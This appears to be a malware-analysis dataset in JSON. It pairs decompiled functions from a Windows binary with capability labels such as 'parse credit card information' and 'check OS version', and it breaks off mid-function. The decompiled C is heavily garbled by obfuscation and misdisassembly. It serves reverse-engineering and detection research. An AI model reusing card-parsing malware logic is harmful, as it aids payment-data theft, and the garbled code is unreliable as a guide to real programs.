{
    "00401200": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004013da) overlaps instruction at (ram,0x004013d9)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00401226)\n// WARNING: Removing unreachable block (ram,0x00401405)\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint8_t * __cdecl fcn.00401200(uint32_t *arg_8h, uint arg_ch)\n\n{\n    char *pcVar1;\n    uint8_t **ppuVar2;\n    uint32_t uVar3;\n    char cVar4;\n    uint32_t uVar5;\n    int16_t iVar6;\n    uchar in_AL;\n    int16_t iVar7;\n    uint8_t *puVar8;\n    uint8_t uVar9;\n    char cVar14;\n    uint32_t *puVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    int16_t iVar15;\n    int32_t *in_EDX;\n    uint32_t *puVar16;\n    uint *puVar17;\n    uint *puVar18;\n    int16_t *piVar19;\n    uchar *unaff_ESI;\n    uint8_t **unaff_EDI;\n    uchar *puVar20;\n    uint8_t **ppuVar21;\n    int16_t in_SS;\n    bool bVar22;\n    bool bVar23;\n    uint8_t in_AF;\n    uint8_t uVar24;\n    bool bVar25;\n    bool bVar26;\n    char in_SF;\n    char in_OF;\n    bool bVar27;\n    unkbyte10 in_ST0;\n    unkbyte10 in_ST1;\n    unkbyte10 in_ST2;\n    unkbyte10 in_ST3;\n    unkbyte10 in_ST4;\n    unkbyte10 in_ST5;\n    unkbyte10 Var28;\n    unkbyte10 in_ST6;\n    unkbyte10 in_ST7;\n    uchar auStack24179 [24051];\n    uint8_t auStack128 [20];\n    uint var_68h;\n    int16_t *piStack92;\n    uint8_t **ppuStack52;\n    uchar *puStack48;\n    uchar *puStack44;\n    int16_t *piStack40;\n    uint32_t *puStack36;\n    uint uStack28;\n    uint uStack24;\n    int16_t iStack20;\n    int16_t iStack18;\n    uint var_4h;\n    uint8_t uVar10;\n    \n    puVar17 = &stack0xfffffffc;\n    uStack24._0_2_ = *0x10 + -4;\n    iVar6 = uStack24;\n    puStack44 = &stack0xfffffffc;\n    if ((in_OF == in_SF) && (iStack20 = unaff_EDI,  in_OF != in_SF)) {\n        unaff_ESI = unaff_ESI + -1;\n        puVar20 = unaff_EDI | &stack0xfffffffc;\n        unaff_EDI = puVar20 + 1;\n        *puVar20 = in_AL;\n        in_EDX = in_EDX & 0xffffff00;\n        in_SS = iStack20;\n    }\n    *arg_8h = 0xe6;\n    bVar25 = (in_EDX & 0x1200) != 0;\n    puStack36 = arg_8h;\n    *(arg_8h + 1) = 0xab;\n    iVar15 = in_EDX;\n    puVar16 = arg_8h;\n    puStack48 = unaff_ESI;\n    if ((bVar25) && (!bVar25)) {\n        puVar16 = arg_8h & 0xffffff00 | *0x4bb148d3;\n        puStack48 = unaff_ESI + 1;\n        out(*unaff_ESI, iVar15);\n    }\n    *(arg_8h + 2) = 0x4f;\n    iVar7 = puVar16;\n    *(arg_8h + 3) = 0x38;\n    *(arg_8h + 1) = 0xf4;\n    iStack18 = puVar16 >> 0x10;\n    *(arg_8h + 5) = 0x87;\n    *(arg_8h + 6) = 0xe6;\n    *(arg_8h + 7) = 0x36;\n    uStack24._0_2_ = arg_8h;\n    *(arg_8h + 2) = 0xed;\n    *(arg_8h + 9) = 1;\n    if ((in_EDX < 'Q') || (uStack24._2_2_ = iVar7,  iStack20 = iStack18,  'P' < in_EDX)) {\n        *(arg_8h + 10) = 0x8b;\n        puVar16 = puVar16 ^ 0x3d;\n        uStack24._0_2_ = iVar15;\n        uStack24._2_2_ = in_EDX >> 0x10;\n        iStack20 = iVar7;\n        iVar15 = iStack18;\n    }\n    iStack18 = iVar15;\n    puVar18 = &uStack24;\n    *(puVar16 + -0x1f3a4905) = in_ST0;\n    uVar24 = 9 < (puVar16 - 1U & 0xf) | in_AF;\n    *in_EDX = *in_EDX + 0x41c6df84;\n    uVar10 = arg_8h;\n    uVar9 = uVar10 | *(arg_8h + 0xf4d1494);\n    uVar13 = arg_8h & 0xffffff00 | uVar9;\n    *(uVar13 + 0xb) = 0x50;\n    piStack40 = &iStack20;\n    *(uVar13 + 0xc) = 0xc5;\n    cVar14 = (arg_8h & 0xffffff00) >> 8;\n    bVar25 = (arg_8h & 0xffff0000 | CONCAT11(cVar14 - uVar10, uVar9)) != arg_8h;\n    *(arg_8h + 0xd) = 0x4d;\n    piVar19 = &stack0xfffffffc;\n    if ((bVar25) && (piVar19 = &stack0xfffffffc,  !bVar25)) {\n        uStack24._2_2_ = &stack0xfffffffc >> 0x10;\n        cVar4 = '\\x10';\n        do {\n            puVar17 = puVar17 + -1;\n            puVar18 = puVar18 + -1;\n            *puVar18 = *puVar17;\n            cVar4 = cVar4 + -1;\n            piVar19 = &uStack24;\n            piStack92 = &uStack24;\n            uStack24._0_2_ = iVar6;\n        } while ('\\0' < cVar4);\n    }\n    *(arg_8h + 0xe) = 0x72;\n    *(arg_8h + 0xf) = 0x79;\n    puVar11 = arg_8h & 0xffff0000 | CONCAT11(cVar14 - uVar10, uVar9);\n    bVar22 = puVar11 < arg_8h;\n    bVar27 = SBORROW4(puVar11, arg_8h);\n    uVar12 = puVar11 - arg_8h;\n    bVar25 = uVar12 < 0;\n    bVar26 = uVar12 == 0;\n    bVar23 = (POPCOUNT(uVar12 & 0xff) & 1U) == 0;\n    puVar8 = *(piVar19 + 8);\n    puVar8[0x10] = 0xef;\n    ppuVar21 = unaff_EDI;\n    puVar16 = arg_8h;\n    if ((arg_8h <= puVar11) && (puVar11 < arg_8h)) {\n        out(0xc4, puVar8);\n        puVar16 = arg_8h & 0xffffff00 | uVar10 ^ uVar9;\n        ppuVar21 = unaff_EDI + 1;\n        *unaff_EDI = puVar8;\n        uVar9 = arg_8h >> 8;\n        bVar22 = uVar9 < *puVar8;\n        bVar27 = SBORROW1(uVar9, *puVar8);\n        cVar14 = uVar9 - *puVar8;\n        bVar25 = cVar14 < '\\0';\n        bVar26 = cVar14 == '\\0';\n        bVar23 = (POPCOUNT(cVar14) & 1U) == 0;\n    }\n    puVar8[0x11] = 0x1b;\n    if ((!bVar22 && !bVar26) && (bVar22 || bVar26)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    puVar8[0x12] = 0x5a;\n    Var28 = in_ST6;\n    if (bVar27 != bVar25) goto code_r0x0040142b;\n    while( true ) {\n        Var28 = in_ST6;\n        if (bVar27 == bVar25) {\ncode_r0x0040142b:\n            in_ST6 = in_ST5;\n            in_ST5 = in_ST4;\n            in_ST4 = in_ST3;\n            in_ST3 = in_ST2;\n            in_ST2 = in_ST1;\n            puVar8[0x13] = 3;\n        }\n        else {\n            *(puVar8 + -0x7ce92414) = in_ST1;\n            uVar9 = puVar8 + -1;\n            uVar24 = 9 < (uVar9 & 0xf) | uVar24;\n            uVar9 = uVar9 + uVar24 * '\\x06';\n            uVar5 = puVar8 + -1 & 0xffffff00 | uVar9 + (0x90 < (uVar9 & 0xf0) | bVar22 | uVar24 * (0xf9 < uVar9)) * '`';\n            uVar12 = *puVar16;\n            *puVar16 = *puVar16 + 0x40c6df84;\n            uVar12 = 0xbf39207b < uVar12;\n            uVar3 = uVar5 + *arg_8h;\n            bVar22 = CARRY4(uVar5, *arg_8h) || CARRY4(uVar3, uVar12);\n            bVar27 = SCARRY4(uVar5, *arg_8h) != SCARRY4(uVar3, uVar12);\n            puVar8 = uVar3 + uVar12;\n            bVar23 = (POPCOUNT(puVar8 & 0xff) & 1U) == 0;\n            Var28 = in_ST7;\n        }\n        if ((bVar23) || (!bVar23)) break;\n        ppuVar2 = segment(in_SS, *0x10 + -0x5e77);\n        puVar8 = *ppuVar2;\n        puVar16 = 0xb7bc9ea5;\n        if (!bVar22) {\n            if (bVar23) {\n                return puVar8;\n            }\n            puVar8 = puVar8;\n            *((auStack24179 ^ arg_8h) - 4) = 0xb7bc9ea5;\n            break;\n        }\n        uVar9 = in(0x9ea5);\n        puVar8 = puVar8 & 0xffffff00 | uVar9;\n        pcVar1 = uVar13 + 0x18;\n        cVar14 = *pcVar1;\n        *pcVar1 = *pcVar1 >> 0xd;\n        bVar22 = (cVar14 >> 0xc & 1U) != 0;\n        bVar25 = *pcVar1 < '\\0';\n        bVar23 = (POPCOUNT(*pcVar1) & 1U) == 0;\n        in_ST1 = in_ST2;\n        in_ST2 = in_ST3;\n        in_ST3 = in_ST4;\n        in_ST4 = in_ST5;\n        in_ST5 = in_ST6;\n        in_ST6 = Var28;\n        if (bVar27 != bVar25) {\n            *(piVar19 + -4) = puVar8;\n            *(piVar19 + -0x68) = uVar9;\n            for (; uVar13 != 0; uVar13 = uVar13 - 1) {\n                *ppuVar21 = puVar8;\n                ppuVar21 = ppuVar21 + 1;\n            }\n            *ppuVar21 = puVar8;\n            *(ppuVar21 + 2) = uVar9;\n            ppuStack52 = unaff_EDI;\n            fcn.00401200(piVar19 + -0x68, piVar19 + -4);\n            puVar8 = fcn.00403a40(piVar19 + -0x68, *(piVar19 + -4), 0x407010, 0xa380);\n            puVar17 = *(piVar19 + 0xc);\n            **(piVar19 + 8) = 0x407010;\n            *puVar17 = 0xa380;\n            return puVar8;\n        }\n    }\n    **(piVar19 + 0xc) = 0x14;\n    return puVar8;\n}\n",
        "token_count": 3053
    },
    "004029b0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402e28) overlaps instruction at (ram,0x00402e24)\n// \n// WARNING: Removing unreachable block (ram,0x00402b66)\n\nuint __fastcall fcn.004029b0(int32_t param_1)\n\n{\n    char *pcVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    int16_t iVar5;\n    int32_t in_EAX;\n    int32_t iVar6;\n    ushort extraout_CX;\n    uint32_t extraout_ECX;\n    char extraout_CH;\n    int32_t extraout_ECX_00;\n    int32_t iVar7;\n    int32_t extraout_ECX_01;\n    uint8_t extraout_DL;\n    uint16_t extraout_DX;\n    int32_t extraout_EDX;\n    uint32_t extraout_EDX_00;\n    int32_t *piVar8;\n    uint8_t uVar9;\n    uint8_t *unaff_EBX;\n    uint *puVar10;\n    uint *unaff_EDI;\n    uint *puVar11;\n    uint16_t in_CS;\n    uint16_t in_SS;\n    uint16_t in_DS;\n    uchar uVar12;\n    uint8_t in_AF;\n    bool bVar13;\n    bool bVar14;\n    char cVar15;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar16;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    unkbyte10 extraout_ST0;\n    ulong uVar17;\n    uint arg_10h;\n    uint arg_14h;\n    uint32_t in_stack_ffffffcc;\n    uint32_t uVar18;\n    uint *arg_14h_00;\n    uint8_t *puVar19;\n    uint uVar20;\n    \n    bVar14 = in_EAX - param_1 < 0;\n    uVar20 = 0x4029cc;\n    fcn.00404910(0x41e814, 10, 0x4113a4, 10);\n    if ((bVar14) || (!bVar14)) {\n        uVar20 = 0x12;\n    }\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    fcn.00404910(0x41e814, 10, 0x4113b0, uVar20);\n    fcn.00404910(0x41e814, 10, 0x4113c4, 4);\n    uVar9 = unaff_EBX >> 8;\n    bVar14 = false;\n    bVar13 = (extraout_DL ^ uVar9 | 0x67) == 0;\n    uVar20 = 0x402a34;\n    fcn.00404910(0x41e814, 10, 0x4113c8, 0xc);\n    if ((bVar14 || bVar13) || (!bVar14 && !bVar13)) {\n        uVar20 = 7;\n    }\n    else {\n        *(unaff_EDI + 0x6a) = *(unaff_EDI + 0x6a) - &stack0xffffffe4;\n    }\n    fcn.00404910(0x41e814, 10, 0x4113d4, uVar20);\n    fcn.00404910(0x41e814, 10, 0x4113dc, 0xb);\n    fcn.00404910(0x41e814, 10, 0x4113e8, 0xc);\n    fcn.00404910(0x41e814, 10, 0x4113f4, 8);\n    fcn.00404910(0x41e814, 10, 0x4113fc, 0xd);\n    uVar18 = extraout_ECX & 0xffff0000 | CONCAT11((extraout_ECX >> 8) - unaff_EBX, extraout_ECX);\n    cVar16 = SBORROW4(uVar18, extraout_EDX);\n    cVar15 = uVar18 - extraout_EDX < 0;\n    fcn.00404910(0x41e814, 10, 0x41140c, 0x18);\n    uVar18 = 0x402b44;\n    uVar17 = fcn.00404910(0x41e814, 10, 0x411424, 0x25);\n    puVar11 = unaff_EDI;\n    if (cVar16 == cVar15) {\n        uVar2 = (uVar17 >> 0x20) << 0x10;\n        uVar18 = uVar18 & 0xffff | uVar2;\n        if (cVar16 != cVar15) {\n            out(0xc4, uVar17);\n            uVar18 = uVar2 | in_DS;\n            in_stack_ffffffcc = in_stack_ffffffcc & 0xffff0000 | in_SS;\n            puVar11 = unaff_EDI + 1;\n            *unaff_EDI = uVar17;\n        }\n    }\n    arg_10h = 10;\n    uVar20 = 0x41e814;\n    fcn.00404910(0x41e814, 10, 0x41144c, 10);\n    fcn.00404910(0x41e814, 10, 0x411458, 0xc);\n    fcn.00404910(0x41e814, 10, 0x411464, 0xd);\n    uVar3 = fcn.00404910(0x41e814, 10, 0x411474, 6);\n    bVar14 = (POPCOUNT(((uVar3 ^ 0x3d) + 0x7c28 ^ extraout_DX & 0xff) + 0xbfff & 0xff) & 1U) == 0;\n    iVar6 = fcn.00404910(0x41e814, 10, 0x41147c, 5);\n    if ((bVar14) || (arg_14h_00 = puVar11,  !bVar14)) {\n        arg_14h_00 = 0xd;\n        uVar18 = 0x411484;\n        in_stack_ffffffcc = 10;\n    }\n    puVar10 = *0x6a17b43a;\n    *(iVar6 + 10) = *(iVar6 + 10) + extraout_CH;\n    fcn.00404910(0x41e814, in_stack_ffffffcc, uVar18, arg_14h_00);\n    bVar14 = (POPCOUNT(unaff_EBX & 0x4d) & 1U) == 0;\n    fcn.00404910(0x41e814, 10, 0x411494, 0x19);\n    if ((!bVar14) && (bVar14)) {\n        puVar11 = &stack0xffffffd4;\n        cVar15 = '\\x1e';\n        do {\n            puVar10 = puVar10 + -1;\n            puVar11 = puVar11 + -1;\n            *puVar11 = *puVar10;\n            cVar15 = cVar15 + -1;\n        } while ('\\0' < cVar15);\n        uVar20 = in(0x78);\n        return uVar20;\n    }\n    fcn.00404910(0x41e814, 10, 0x4114b0, 0xf);\n    uVar3 = fcn.00404910(0x41e814, 10, 0x4114c0, 0xe);\n    cVar15 = uVar3 - *puVar11;\n    uVar18 = (in_NT & 1) * 0x4000 | SBORROW1(uVar3, *puVar11) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (cVar15 < '\\0') * 0x80 | (cVar15 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar15) & 1U) == 0) * 4\n             | uVar3 < *puVar11 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n             (in_AC & 1) * 0x40000;\n    func_0x10188c55();\n    uVar4 = fcn.00404910(0x41e814, 10, 0x4114d0, uVar18);\n    uVar18 = ((uVar4 & 0xff00 | uVar4 & uVar9) ^ 0x6200) - 0x3488 & 0x7ee5;\n    uVar12 = CARRY4(uVar18, uVar18);\n    bVar14 = SCARRY4(uVar18, uVar18);\n    cVar15 = uVar18 == 0;\n    fcn.00404910(0x41e814, 10, 0x4114dc, 0xb);\n    if ((!bVar14) && (bVar14)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    while( true ) {\n        arg_14h = 0x402d54;\n        fcn.00404910(0x41e814, 10, 0x4114e8, 0x41e814);\n        iVar6 = *0x34a96cf3;\n        if ((uVar12) || (!uVar12)) break;\n        iVar7 = extraout_ECX_00 + -1;\n        if (iVar7 == 0 || cVar15 == '\\0') {\ncode_r0x00402d60:\n            *(puVar11 + 1) = 0x34a96cf7;\n            pcVar1 = (iVar6 >> 0x1f) + 10;\n            *pcVar1 = *pcVar1 + (iVar7 >> 8 | *(*0x9750e2b5 + -0xc));\n            fcn.00404910(0x41e814, uVar20, arg_10h, arg_14h);\n            bVar14 = false;\n            fcn.00404910(0x41e814, 10, 0x411500, 0xc);\n            if ((bVar14) || (!bVar14)) {\n                uVar18 = 0xe;\n            }\n            else {\n                *0xae8a637e = *0xae8a637e ^ 0x6a27e95e;\n                uVar18 = extraout_EDX_00 & 0xffff0000 | in_CS;\n            }\n            fcn.00404910(0x41e814, 10, 0x41150c, uVar18);\n            uVar17 = fcn.00404910(0x41e814, 10, 0x41151c, 0x11);\n            piVar8 = uVar17 >> 0x20;\n            *(uVar17 + -0x7ce92414) = extraout_ST0;\n            *piVar8 = *piVar8 + 0x136adf84;\n            fcn.00404910(0x41e814, 10, 0x411530, unaff_EBX);\n            while( true ) {\n                fcn.00404910(0x41e814, 10, 0x411544, 0x14);\n                puVar19 = 0x41e814;\n                iVar5 = fcn.00404910(0x41e814, 10, 0x411558, 0x33);\n                uVar9 = (unaff_EBX ^ 0x70c5) - iVar5 >> 8 | extraout_CX >> 8;\n                uVar3 = extraout_CX;\n                cVar16 = SBORROW1(uVar9, uVar3);\n                cVar15 = uVar9 - uVar3 < '\\0';\n                bVar14 = uVar9 == uVar3;\n                fcn.00404910(0x41e814, 10, 0x41158c, 10);\n                if ((bVar14 || cVar16 != cVar15) || (!bVar14 && cVar16 == cVar15)) break;\n                unaff_EBX = puVar19;\n                if (extraout_ECX_01 != 0) {\n                    do {\n    // WARNING: Do nothing block with infinite loop\n                    } while( true );\n                }\n            }\n            fcn.00404910(0x41e814, 10, 0x411598, 4);\n            fcn.00404910(0x41e814, 10, 0x41159c, 5);\n            fcn.00404910(0x41e814, 10, 0x4115a4, 6);\n            fcn.00404910(0x41e814, 10, 0x4115d8, 0x2a);\n            uVar20 = fcn.00404910(0x41e814, 10, 0x411604, 0xb);\n            return uVar20;\n        }\n    }\n    arg_14h = 10;\n    arg_10h = 0x4114f4;\n    uVar20 = 10;\n    iVar7 = extraout_ECX_00;\n    goto code_r0x00402d60;\n}\n",
        "token_count": 3129
    },
    "00401500": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004017ba) overlaps instruction at (ram,0x004017b8)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint * __cdecl fcn.00401500(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    char cVar4;\n    char *pcVar3;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    int32_t extraout_ECX_02;\n    int32_t iVar6;\n    int32_t extraout_ECX_03;\n    char extraout_DH;\n    ushort uVar7;\n    uchar uVar8;\n    uint *puVar9;\n    uint *puVar10;\n    uint8_t in_AF;\n    bool bVar11;\n    ulong uVar12;\n    unkbyte6 Var13;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar10 = &var_213h;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    s = 0;\n    puVar10 = &var_10fh;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    var_ch = 1;\n    *(puVar10 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(0xec, 0xb0, 0xe8, arg_8h);\n    fcn.00401470(&var_4h, &var_8h);\n    iVar5 = fcn.00404220(arg_8h, arg_ch, arg_10h, arg_14h, var_4h, var_8h);\n    if (iVar5 == 0) {\n        return NULL;\n    }\n    iVar5 = fcn.00404db0(&s, var_4h, var_8h);\n    if (iVar5 == 0) {\n        return NULL;\n    }\n    bVar11 = extraout_DH + -0x36 < '\\0';\n    iVar5 = fcn.00404ed0();\n    if ((bVar11) || (!bVar11)) {\n        pcVar3 = fcn.00402860(0xe8);\n    }\n    else {\n        uVar2 = in(0x11);\n        pcVar3 = iVar5 + 0x4113e868U & 0xffffff00 | uVar2;\n        *pcVar3 = *pcVar3 + uVar2;\n    }\n    if (pcVar3 == 0xffffffff) {\n        iVar5 = fcn.00402860(0xdc);\n        if (iVar5 == -1) goto code_r0x004016e6;\n        uVar8 = 0xf;\n    }\n    else {\n        uVar8 = 0xe;\n    }\n    iVar5 = fcn.00404a70(arg_8h);\n    if (iVar5 != 0) {\n        fcn.00404510(uVar8);\n        fcn.00401860(uVar8);\n        return 0x1;\n    }\n    if (*0x41e848 == 0) {\n        return NULL;\n    }\ncode_r0x004016e6:\n    Var13 = fcn.00404750(arg_8h, &s);\n    uVar7 = Var13 >> 0x20;\n    iVar5 = var_ch;\n    if (Var13 == 0) {\n        iVar5 = 0;\n    }\n    iVar6 = extraout_ECX;\n    if (iVar5 != 0) {\n        Var13 = fcn.00402360(arg_8h);\n        uVar7 = Var13 >> 0x20;\n        iVar6 = extraout_ECX_00;\n        if (Var13 == 0) {\n            iVar5 = Var13;\n        }\n    }\n    Var13 = CONCAT24(uVar7, iVar5);\n    bVar11 = iVar5 == 0;\n    if (bVar11) {\n        Var13 = fcn.00404b40(arg_8h, 0);\n        iVar6 = extraout_ECX_01;\n    }\n    puVar9 = Var13;\n    puVar10 = puVar9;\n    if ((!bVar11 || *0x10 != 0x22b) && (bVar11 && *0x10 == 0x22b)) {\n        puVar10 = puVar9 + 1;\n        out(*puVar9, Var13 >> 0x20);\n    }\n    if (puVar10 != NULL) {\n        fcn.00401860(0xff);\n        iVar6 = extraout_ECX_02;\n    }\n    bVar11 = (POPCOUNT(iVar6 - 0x5354U & 0xff) & 1U) == 0;\n    uVar12 = (*_sym.imp.KERNEL32.dll_Sleep)(0xe8);\n    pcVar3 = uVar12 >> 0x20;\n    iVar5 = uVar12;\n    if ((!bVar11) && (bVar11)) {\n        out(*puVar10, uVar12 >> 0x20);\n        do {\n            cVar4 = iVar5 >> 8;\n            in_AF = 9 < (iVar5 & 0xf) | in_AF;\n            iVar5 = CONCAT31(CONCAT21(iVar5 >> 0x10, cVar4 - in_AF), -in_AF);\n        } while (in_AF || cVar4 == *pcVar3);\n        piVar1 = (arg_8h & 0xffff0000 | arg_8h & 0xff | (arg_8h >> 8) << 8) + pcVar3 * 2;\n        *piVar1 = (*piVar1 + 0x7b) - in_AF;\n        *(extraout_ECX_03 + 0x6a) = iVar5;\n        *(iVar5 + -4) = *(iVar5 + -4) + (extraout_ECX_03 >> 8);\n        puVar10 = puVar10 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)();\n    return puVar10;\n}\n",
        "token_count": 1533
    },
    "00401a40": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00401a40(uint s1)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EDI;\n    uint32_t uVar2;\n    float10 fVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fVar3 = (*_sym.imp.MSVCRT.dll__strlwr)(s1);\n    if (-1 < &stack0xffffffdc) {\n        if (-1 >= &stack0xffffffdc) {\n            *(unaff_EDI + 0x1c) = fVar3;\n        }\n    }\n    uVar2 = 0;\n    do {\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(s1);\n        if (iVar1 != 0) {\n            return true;\n        }\n        uVar2 = uVar2 + 1;\n    } while (uVar2 < 5);\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(s1);\n    return iVar1 == 0;\n}\n",
        "token_count": 261
    },
    "00403800": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040383e) overlaps instruction at (ram,0x0040383c)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t __cdecl\nfcn.00403800(uint arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h, uint arg_18h, int32_t *arg_1ch, int32_t arg_20h)\n\n{\n    uint arg_10h_00;\n    char cVar1;\n    uint32_t *puVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint8_t extraout_DL;\n    uint8_t uVar6;\n    ushort extraout_DX;\n    uint arg_8h_00;\n    uint unaff_EBX;\n    uint *puVar7;\n    uint *unaff_EBP;\n    int32_t unaff_ESI;\n    int32_t *unaff_EDI;\n    uint *puVar8;\n    ushort in_SS;\n    uchar uVar9;\n    bool bVar10;\n    ulong uVar11;\n    uchar var_10ch;\n    uint var_10bh;\n    uint uStack44;\n    int32_t *arg_ch_00;\n    int32_t *arg_14h_00;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar9 = &stack0xfffffffc < 0x10c;\n    bVar10 = (POPCOUNT(&stack0xfffffef0 & 0xff) & 1U) == 0;\n    if ((!bVar10) && (bVar10)) {\n        puVar8 = segment(in_SS, *0x10 + -0x11c);\n        puVar7 = &stack0xfffffee4 & 0xffff0000 | *0x10 - 0x118;\n        if (uVar9) goto code_r0x0040385b;\n        if (bVar10) {\n            puVar7[-1] = *puVar8;\n            puVar7[-2] = puVar7 + 1;\n            puVar7[-3] = puVar7 + 2;\n            puVar7[-4] = 0x4115a4;\n            puVar7[-5] = 0x411558;\n            puVar7[-6] = 0x80000002;\n            *puVar7 = 4;\n            puVar7[-7] = 0x4037de;\n            iVar4 = fcn.00401870(puVar7[-6], puVar7[-5], puVar7[-4], puVar7[-3], puVar7[-2], puVar7[-1]);\n            if ((iVar4 == 0) || (uVar5 = puVar7[1],  5 < uVar5)) {\n                uVar5 = 0xffffffff;\n            }\n            return uVar5;\n        }\n        uVar9 = false;\n    }\n    var_8h = arg_20h + 0x20;\n    arg_14h_00 = 0x20;\n    unaff_EBX = arg_18h;\n    unaff_EBP = &stack0xfffffffc;\n    unaff_ESI = arg_20h;\n    unaff_EDI = arg_1ch;\n    arg_ch_00 = arg_1ch;\n    while( true ) {\n        fcn.00404110(unaff_EBX, arg_ch_00, arg_8h, arg_14h_00, var_8h);\ncode_r0x0040385b:\n        var_8h = unaff_EBP[3];\n        arg_8h = unaff_EBX;\n        arg_14h_00 = unaff_EDI;\n        puVar2 = fcn.00404110(unaff_EBX, unaff_EDI, var_8h, 0x20, unaff_ESI + 0x60);\n        if ((uVar9) || (!uVar9)) break;\n        arg_ch_00 = 0xb7f8c08b;\n        if (&stack0xffffffec < *puVar2 || puVar2 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *(puVar2 + 0x6b) = *(puVar2 + 0x6b) & extraout_DL;\n        uVar9 = false;\n        *(extraout_ECX + 0x57) = *(extraout_ECX + 0x57) & extraout_DL;\n    }\n    uStack44 = 0x4038a5;\n    fcn.00404110(unaff_EBX, unaff_EDI, unaff_EBP[4], 0x20, unaff_ESI + 0xa0);\n    arg_14h = CONCAT22(unaff_EBX, extraout_DX);\n    arg_10h_00 = unaff_EBP[5];\n    arg_8h_00 = unaff_EBP[6];\n    arg_14h = unaff_ESI + 0xe0;\n    while( true ) {\n        uVar11 = fcn.00404110(arg_8h_00, unaff_EDI, arg_10h_00, 0x20, arg_14h);\n        arg_8h_00 = uVar11 >> 0x20;\n        pcVar3 = uVar11;\n        if ((0xffffffeb < *0x10) || (0xffffffeb >= *0x10)) break;\n        if (extraout_ECX_00 == 1 || *0x10 != 0xfffffffc) {\n            *unaff_EDI = unaff_ESI + 4;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *pcVar3 = *pcVar3 + uVar11;\n        uVar6 = uVar11 >> 0x20;\n        pcVar3[0x6a] = pcVar3[0x6a] + uVar6;\n        *(extraout_ECX_00 + 0x56) = *(extraout_ECX_00 + 0x56) & uVar6;\n    }\n    arg_14h = 0x403902;\n    iVar4 = func_0x004037b0();\n    if (iVar4 == -1) {\n        arg_14h = 0x403915;\n        iVar4 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(unaff_ESI + 0x120) = iVar4 % 5;\n    }\n    else {\n        *(unaff_ESI + 0x120) = iVar4;\n    }\n    *(unaff_EBP + -0x43) = 0;\n    puVar8 = unaff_EBP + -0x10b;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    unaff_EBP[-1] = 0x104;\n    *(puVar8 + 2) = 0;\n    arg_14h = unaff_EBP + -1;\n    uVar5 = fcn.00401870(0x80000001, 0x4115d8, 0x411604, unaff_EBP + -2, unaff_EBP + -0x43, arg_14h);\n    if (uVar5 != 0) {\n        arg_14h = 0x411654;\n        uVar5 = (*_sym.imp.MSVCRT.dll__stricmp)();\n        bVar10 = (POPCOUNT(uVar5 & 0xff) & 1U) != 0;\n        if 